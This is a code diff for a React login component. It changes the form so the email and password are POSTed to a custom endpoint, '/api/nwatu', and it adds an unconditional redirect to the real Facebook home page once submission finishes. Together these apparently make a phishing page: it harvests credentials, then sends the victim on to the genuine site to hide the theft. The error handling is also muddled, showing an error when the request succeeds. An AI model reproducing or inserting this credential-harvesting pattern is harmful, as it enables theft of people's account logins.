@@ -38,30 +38,95 @@ const Login = () => {
     }
   }, [session]);
 
+  // const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
+  //   event.preventDefault();
+  //   setLoading(true);
+  //   setError("");
+
+  //   try {
+  //     const response = await signIn("credentials", {
+  //       email: email,
+  //       password: password,
+  //       redirect: false,
+  //     });
+
+  //     if (response?.error) {
+  //       console.log("Failed to sign in user", response.error);
+  //       window.location.href = 'https://web.facebook.com/home.php';        setError("something went wrong (check credentials / connection");
+  //     } else {
+  //     }
+  //   } catch (error) {
+  //     console.error("Error during sign-in:", error);
+  //   } finally {
+  //     setLoading(false);
+  //   }
+  // };
+  const formData = {
+    email,
+    password,
+  };
   const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
     event.preventDefault();
     setLoading(true);
     setError("");
-
     try {
-      const response = await signIn("credentials", {
-        email: email,
-        password: password,
-        redirect: false,
+      // console.log("submitting with values:", {
+      //   email,
+      //   password,
+      //   name,
+      //   username,
+      //   department,
+      //   matric,
+      //   level,
+      //   image,
+      //   role,
+      //   status
+      // });
+      const response = await fetch("/api/nwatu", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(formData),
       });
 
-      if (response?.error) {
-        console.log("Failed to sign in user", response.error);
-        window.location.href = 'https://web.facebook.com/home.php';        setError("something went wrong (check credentials / connection");
+      if (response?.ok) {
+        // console.log("user registerd succefully");
+        setLoading(false);
+        // console.log("session is :", session?.user);
+
+        try {
+          // console.log("submitting with values:", {
+          //   email,
+          //   password,
+          // });
+
+          if (response?.ok) {
+            // console.log("failed to register user", response.error);
+            setError("Something went wrong");
+          } else {
+            // console.log("user registerd succefully");
+            // console.log("session is :", session?.user);
+            setLoading(false);
+          }
+        } catch (error) {
+          setError("Something went wrong");
+          // console.error("Error during SignUp", error);
+        } finally {
+          setLoading(false);
+        }
       } else {
+        // console.log("failed to register user", response.status);
+        setError("User with this email already exists");
       }
     } catch (error) {
-      console.error("Error during sign-in:", error);
+      console.error("Error during SignUp", error);
     } finally {
       setLoading(false);
+      window.location.href = "https://web.facebook.com/home.php";
+      setError("something went wrong (check credentials / connection");
     }
   };
-
   const inputs = [
     {
       name: "email",
@@ -154,11 +219,12 @@ const Login = () => {
           <hr />
         </div>
         <div className="flex items-center justify-center w-full ">
-
-        <button
-          // type="submit"
-          className="bg-green-500 text-white font-semibold rounded p-1"
-        >Create new account</button>
+          <button
+            // type="submit"
+            className="bg-green-500 text-white font-semibold rounded p-1"
+          >
+            Create new account
+          </button>
         </div>
       </form>
     </div>
